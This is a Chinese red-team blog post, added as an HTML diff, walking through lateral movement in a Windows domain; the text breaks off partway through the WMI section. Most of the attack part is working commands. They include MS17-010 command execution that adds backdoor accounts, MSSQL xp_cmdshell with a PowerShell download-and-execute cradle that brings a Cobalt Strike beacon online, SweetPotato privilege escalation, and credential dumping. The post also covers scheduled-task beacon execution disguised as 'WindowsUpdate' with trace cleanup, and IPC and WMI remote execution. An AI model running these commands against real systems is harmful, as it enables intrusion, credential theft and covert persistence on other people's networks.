@@ -1,0 +1,631 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网横向移动技术 | kenny's blog</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="f6f7f9"><meta name="description" content="横向移动概述在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证、利用服务漏洞、滥用系统特性等方法，访问域内其他机器，进一步扩大资产范围。 横向移动的最终目标通常是获得域控制器的访问权限，从而完全控制基于 Windows 的整个内网环境。  横向移动的四大维度 漏洞利用：利用操作系统或服务的已知漏洞（如 MS17-010、CVE-2019-0708） 服务利">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网横向移动技术">
+<meta property="og:url" content="https://www.52jl.top/2026/02/13/nw2/index.html">
+<meta property="og:site_name" content="kenny&#39;s blog">
+<meta property="og:description" content="横向移动概述在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证、利用服务漏洞、滥用系统特性等方法，访问域内其他机器，进一步扩大资产范围。 横向移动的最终目标通常是获得域控制器的访问权限，从而完全控制基于 Windows 的整个内网环境。  横向移动的四大维度 漏洞利用：利用操作系统或服务的已知漏洞（如 MS17-010、CVE-2019-0708） 服务利">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-09.webp">
+<meta property="article:published_time" content="2026-02-13T08:49:36.462Z">
+<meta property="article:modified_time" content="2026-02-13T08:49:36.462Z">
+<meta property="article:author" content="Kenny">
+<meta property="article:tag" content="Cobalt Strike">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="流量转发">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-09.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "内网横向移动技术",
+  "url": "https://www.52jl.top/2026/02/13/nw2/",
+  "image": "https://www.52jl.top/img/covers/shinchan-cover-09.webp",
+  "datePublished": "2026-02-13T08:49:36.462Z",
+  "dateModified": "2026-02-13T08:49:36.462Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Kenny",
+      "url": "https://www.52jl.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/13/nw2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网横向移动技术',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css?v=20260213b"><meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex,max-snippet:0,max-image-preview:none,max-video-preview:0">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<script>
+(() => {
+  try {
+    const isAutomation = navigator.webdriver || /HeadlessChrome|PhantomJS|puppeteer|playwright/i.test(navigator.userAgent || '');
+    if (!isAutomation) return;
+    const selectors = ['#article-container', 'article', '.post-content', '.post-body'];
+    selectors.forEach((s) => {
+      document.querySelectorAll(s).forEach((el) => {
+        el.innerHTML = '<p>Content unavailable.</p>';
+      });
+    });
+  } catch (e) {}
+})();
+</script>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: 'unsafe-inline'; img-src 'self' https: data: blob:; font-src 'self' https: data:; connect-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
+<script>
+(() => {
+  try {
+    if (window.top !== window.self) {
+      window.top.location = window.self.location.href;
+      return;
+    }
+
+    const host = window.location.hostname;
+    const isLocal = host === 'localhost' || host === '127.0.0.1';
+    if (!isLocal && window.location.protocol === 'http:') {
+      window.location.replace('https://' + window.location.host + window.location.pathname + window.location.search + window.location.hash);
+    }
+  } catch (e) {}
+})();
+</script>
+</head><body><div class="bg-animation" id="web_bg" style="background-color: #f6f7f9;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">kenny's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">内网横向移动技术</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">内网横向移动技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-13T08:49:36.462Z" title="发表于 2026-02-13 16:49:36">2026-02-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-13T08:49:36.462Z" title="更新于 2026-02-13 16:49:36">2026-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></span></div><div class="meta-secondline"></div></div></div><article class="container post-content" id="article-container"><h1 id="横向移动概述"><a href="#横向移动概述" class="headerlink" title="横向移动概述"></a>横向移动概述</h1><p>在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证、利用服务漏洞、滥用系统特性等方法，访问域内其他机器，进一步扩大资产范围。</p>
+<p>横向移动的最终目标通常是获得域控制器的访问权限，从而完全控制基于 Windows 的整个内网环境。</p>
+<hr>
+<h2 id="横向移动的四大维度"><a href="#横向移动的四大维度" class="headerlink" title="横向移动的四大维度"></a>横向移动的四大维度</h2><ol>
+<li><strong>漏洞利用</strong>：利用操作系统或服务的已知漏洞（如 MS17-010、CVE-2019-0708）</li>
+<li><strong>服务利用</strong>：滥用合法的 Windows 服务（如 SMB、WMI、WinRM、PSEXEC）</li>
+<li><strong>令牌横向</strong>：窃取和滥用访问令牌实现权限提升和横向</li>
+<li><strong>软件部署利用</strong>：利用企业部署工具（如 SCCM、GPO）进行批量横向</li>
+</ol>
+<hr>
+<h1 id="漏洞利用横向"><a href="#漏洞利用横向" class="headerlink" title="漏洞利用横向"></a>漏洞利用横向</h1><h2 id="MS17-010（永恒之蓝）"><a href="#MS17-010（永恒之蓝）" class="headerlink" title="MS17-010（永恒之蓝）"></a>MS17-010（永恒之蓝）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>MS17-010 是 SMB 协议的远程代码执行漏洞，影响 Windows XP 至 Windows Server 2016 的多个版本。该漏洞无需认证即可触发，危害极大。</p>
+<h3 id="利用注意事项"><a href="#利用注意事项" class="headerlink" title="利用注意事项"></a>利用注意事项</h3><p><strong>警告</strong>：MS17-010 利用可能导致目标系统蓝屏崩溃，在生产环境中需谨慎使用。</p>
+<h3 id="安全利用方法"><a href="#安全利用方法" class="headerlink" title="安全利用方法"></a>安全利用方法</h3><p>使用 MSF 的命令执行模块（不会蓝屏）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.3.10</span><br><span class="line"><span class="built_in">set</span> COMMAND net user hacker Pass123! /add</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><strong>优势</strong>：</p>
+<ul>
+<li>仅执行命令，不注入 Payload</li>
+<li>稳定性高，不会导致系统崩溃</li>
+<li>适合批量添加后门账户</li>
+</ul>
+<h3 id="检测与防御"><a href="#检测与防御" class="headerlink" title="检测与防御"></a>检测与防御</h3><p><strong>检测方法</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 MSF 扫描模块</span></span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.3.0/24</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御措施</strong>：</p>
+<ul>
+<li>安装 MS17-010 补丁</li>
+<li>禁用 SMBv1 协议</li>
+<li>限制 445 端口访问</li>
+</ul>
+<hr>
+<h2 id="内网常见漏洞清单"><a href="#内网常见漏洞清单" class="headerlink" title="内网常见漏洞清单"></a>内网常见漏洞清单</h2><h3 id="操作系统服务漏洞"><a href="#操作系统服务漏洞" class="headerlink" title="操作系统服务漏洞"></a>操作系统服务漏洞</h3><table>
+<thead>
+<tr>
+<th>漏洞编号</th>
+<th>影响系统</th>
+<th>利用难度</th>
+<th>危害等级</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MS08-067</td>
+<td>Windows XP&#x2F;2003</td>
+<td>低</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>MS17-010</td>
+<td>Windows 7&#x2F;2008&#x2F;2012</td>
+<td>低</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>CVE-2019-0708</td>
+<td>Windows 7&#x2F;2008 R2</td>
+<td>中</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>CVE-2020-0796</td>
+<td>Windows 10 1903&#x2F;1909</td>
+<td>中</td>
+<td>严重</td>
+</tr>
+</tbody></table>
+<h3 id="操作系统弱口令"><a href="#操作系统弱口令" class="headerlink" title="操作系统弱口令"></a>操作系统弱口令</h3><ul>
+<li><strong>SSH</strong>：Linux 系统的远程管理协议（22 端口）</li>
+<li><strong>RDP</strong>：Windows 远程桌面（3389 端口）</li>
+<li><strong>VNC</strong>：跨平台远程桌面（5900 端口）</li>
+<li><strong>Telnet</strong>：明文传输的远程管理协议（23 端口）</li>
+</ul>
+<h3 id="数据库漏洞与弱口令"><a href="#数据库漏洞与弱口令" class="headerlink" title="数据库漏洞与弱口令"></a>数据库漏洞与弱口令</h3><ul>
+<li><strong>MySQL</strong>：默认 3306 端口，常见弱口令 root&#x2F;root</li>
+<li><strong>MSSQL</strong>：默认 1433 端口，支持 xp_cmdshell 命令执行</li>
+<li><strong>Redis</strong>：默认 6379 端口，未授权访问可写 SSH 密钥</li>
+<li><strong>MongoDB</strong>：默认 27017 端口，未授权访问可导出数据</li>
+</ul>
+<h3 id="中间件与框架漏洞"><a href="#中间件与框架漏洞" class="headerlink" title="中间件与框架漏洞"></a>中间件与框架漏洞</h3><ul>
+<li><strong>Struts2 系列</strong>：S2-001&#x2F;S2-045&#x2F;S2-057 等 RCE 漏洞</li>
+<li><strong>Weblogic 系列</strong>：反序列化、SSRF、任意文件上传</li>
+<li><strong>JBoss 系列</strong>：JMX Console 未授权访问</li>
+<li><strong>Tomcat 系列</strong>：弱口令、war 包部署</li>
+<li><strong>Jenkins</strong>：未授权访问、脚本命令执行</li>
+</ul>
+<h3 id="开源框架与系统漏洞"><a href="#开源框架与系统漏洞" class="headerlink" title="开源框架与系统漏洞"></a>开源框架与系统漏洞</h3><ul>
+<li><strong>Fastjson</strong>：反序列化 RCE（多个版本）</li>
+<li><strong>Shiro</strong>：反序列化 RCE（RememberMe）</li>
+<li><strong>禅道项目管理系统</strong>：SQL 注入、文件上传</li>
+<li><strong>Jumpserver</strong>：未授权访问、RCE</li>
+<li><strong>泛微 OA &#x2F; 金蝶 OA &#x2F; 蓝凌 OA &#x2F; 致远 OA</strong>：SQL 注入、文件上传、命令执行</li>
+</ul>
+<hr>
+<h1 id="服务利用横向"><a href="#服务利用横向" class="headerlink" title="服务利用横向"></a>服务利用横向</h1><h2 id="实战案例：从边界到域控"><a href="#实战案例：从边界到域控" class="headerlink" title="实战案例：从边界到域控"></a>实战案例：从边界到域控</h2><h3 id="第一步：边界扫描与突破"><a href="#第一步：边界扫描与突破" class="headerlink" title="第一步：边界扫描与突破"></a>第一步：边界扫描与突破</h3><p><strong>使用 fscan 进行内网扫描</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 192.168.3.0/24 -p 1-65535</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw2/1.webp" loading='lazy'></p>
+<p><strong>发现 MSSQL 弱口令</strong>：</p>
+<ul>
+<li>目标：192.168.3.144</li>
+<li>服务：MSSQL (1433)</li>
+<li>凭证：sa &#x2F; Admin12345</li>
+</ul>
+<hr>
+<h3 id="第二步：MSSQL-利用上线"><a href="#第二步：MSSQL-利用上线" class="headerlink" title="第二步：MSSQL 利用上线"></a>第二步：MSSQL 利用上线</h3><p><strong>使用 SharpSQLTools 直接上线 CS</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 Cobalt Strike 中执行</span></span><br><span class="line">execute-assembly SharpSQLTools.exe 192.168.3.144 sa Admin12345 enable_xp_cmdshell</span><br><span class="line">execute-assembly SharpSQLTools.exe 192.168.3.144 sa Admin12345 xp_cmdshell <span class="string">&quot;powershell -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.100/payload.ps1&#x27;))\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw2/2.webp" loading='lazy'></p>
+<p><strong>原理</strong>：</p>
+<ol>
+<li>启用 xp_cmdshell 存储过程</li>
+<li>通过 xp_cmdshell 执行 PowerShell 命令</li>
+<li>下载并执行 Beacon Payload</li>
+</ol>
+<hr>
+<h3 id="第三步：权限提升"><a href="#第三步：权限提升" class="headerlink" title="第三步：权限提升"></a>第三步：权限提升</h3><p><strong>使用 SweetPotato 提权至 SYSTEM</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 Beacon 中执行</span></span><br><span class="line">execute-assembly SweetPotato.exe -a <span class="string">&quot;C:\Windows\System32\cmd.exe /c whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw2/3.webp" loading='lazy'></p>
+<p><strong>SweetPotato 原理</strong>：</p>
+<ul>
+<li>利用 Windows 令牌模拟机制</li>
+<li>通过 COM 对象触发 SYSTEM 权限进程</li>
+<li>窃取 SYSTEM 令牌并执行命令</li>
+</ul>
+<hr>
+<h3 id="第四步：信息收集"><a href="#第四步：信息收集" class="headerlink" title="第四步：信息收集"></a>第四步：信息收集</h3><p><strong>1. 定位域控</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询域控制器</span></span><br><span class="line">shell net group <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw2/4.webp" loading='lazy'></p>
+<p><strong>2. 解析域控 IP</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ping -n 1 OWA2010SP3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw2/5.webp" loading='lazy'></p>
+<p><strong>结果</strong>：域控 IP 为 192.168.31.142</p>
+<p><strong>3. 端口扫描</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portscan 192.168.31.142 1-65535</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw2/6.webp" loading='lazy'></p>
+<p><strong>4. 查询域管理员</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw2/7.webp" loading='lazy'></p>
+<p><strong>5. 抓取凭证</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw2/9.webp" loading='lazy'></p>
+<p><strong>获得域管凭证</strong>：</p>
+<ul>
+<li>用户名：sqladmin</li>
+<li>密码：admin!@#45</li>
+</ul>
+<hr>
+<h3 id="第五步：SMB-横向至域控"><a href="#第五步：SMB-横向至域控" class="headerlink" title="第五步：SMB 横向至域控"></a>第五步：SMB 横向至域控</h3><p><strong>1. 生成 SMB Beacon</strong>：</p>
+<p>在 Cobalt Strike 中创建 SMB Listener（使用命名管道通信）。</p>
+<p><strong>2. 上传 Beacon 到边界机</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /path/to/smb_beacon.exe C:\Windows\Temp\smb.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 通过计划任务远程执行</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建计划任务</span></span><br><span class="line">shell schtasks /create /s 192.168.3.142 /ru system /u sqladmin /p admin!@#45 /tn transfer /sc DAILY /tr C:\smb.exe /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 立即运行任务</span></span><br><span class="line">shell schtasks /run /s 192.168.3.142 /u sqladmin /p admin!@#45 /tn transfer /i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除任务（清理痕迹）</span></span><br><span class="line">shell schtasks /delete /s 192.168.3.142 /u sqladmin /p admin!@#45 /tn transfer /f</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 建立 SMB 连接</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">link</span> 192.168.3.142</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw2/8.webp" loading='lazy'></p>
+<p><strong>5. 验证横向成功</strong>：</p>
+<p><img src="/2026/02/13/nw2/10.webp" loading='lazy'></p>
+<p><strong>SMB Beacon 优势</strong>：</p>
+<ul>
+<li>流量通过命名管道传输，不直接连接 C2</li>
+<li>隐蔽性高，难以被网络监控发现</li>
+<li>适合跨网段横向</li>
+</ul>
+<hr>
+<h2 id="IPC-横向移动"><a href="#IPC-横向移动" class="headerlink" title="IPC 横向移动"></a>IPC 横向移动</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>IPC（Internet Process Connection）是 Windows 为进程间通信开放的命名管道资源。通过 IPC$ 共享，可以使用管理员凭证远程执行命令。</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
+<li>目标机开启 139&#x2F;445 端口</li>
+<li>目标主机管理员开启 IPC$ 默认共享</li>
+<li>已知目标机的管理员账户密码</li>
+</ol>
+<h3 id="实战操作"><a href="#实战操作" class="headerlink" title="实战操作"></a>实战操作</h3><p><strong>1. 建立 IPC 连接</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.3.142\ipc$ <span class="string">&quot;admin!@#45&quot;</span> /user:sqladmin</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 验证连接</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 远程执行命令</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell tasklist /S 192.168.3.142 /U sqladmin /P admin!@#45</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw2/11.webp" loading='lazy'></p>
+<p><strong>4. 复制文件到目标机</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy beacon.exe \\192.168.3.142\C$\Windows\Temp\</span><br></pre></td></tr></table></figure>
+
+<p><strong>5. 通过计划任务执行</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /create /s 192.168.3.142 /u sqladmin /p admin!@#45 /tn <span class="string">&quot;WindowsUpdate&quot;</span> /tr C:\Windows\Temp\beacon.exe /sc ONSTART /ru system /f</span><br><span class="line">shell schtasks /run /s 192.168.3.142 /u sqladmin /p admin!@#45 /tn <span class="string">&quot;WindowsUpdate&quot;</span> /i</span><br></pre></td></tr></table></figure>
+
+<p><strong>6. 断开 IPC 连接</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.3.142\ipc$ /delete</span><br></pre></td></tr></table></figure>
+
+<h3 id="IPC-横向的局限性"><a href="#IPC-横向的局限性" class="headerlink" title="IPC 横向的局限性"></a>IPC 横向的局限性</h3><ul>
+<li>需要明文密码（不支持 Hash）</li>
+<li>容易被日志记录（Event ID 4624&#x2F;4672）</li>
+<li>需要目标机开启 IPC$ 共享</li>
+</ul>
+<hr>
+<h2 id="WMI-横向移动"><a href="#WMI-横向移动" class="headerlink" title="WMI 横向移动"></a>WMI 横向移动</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>WMI（Windows Management Instrumentation）是 Windows 的管理框架，从 Windows 2003 开始内置。WMI 支持远程管理，可以使用明文密码或 NTLM Hash 进行认证。</p>
+<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
+<li>WMI 服务开启（端口 135，默认开启）</li>
+<li>防火墙允许 135&#x2F;445 端口通信</li>
+<li>已知目标机的管理员凭证</li>
+</ol>
+<h3 id="实战操作-1"><a href="#实战操作-1" class="headerlink" title="实战操作"></a>实战操作</h3><p><strong>1. 使用 Windows 自带 WMIC（无回显）</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell wmic /node:192.168.3.142 /user:sqladmin /password:admin!@#45 process call create <span class="string">&quot;cmd.exe /c ipconfig &gt; C:\1.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw2/12.webp" loading='lazy'></p>
+<p><strong>2. 查看执行结果</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> \\192.168.3.142\C$\1.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 使用 Impacket 工具（有回显）</strong>：</p>
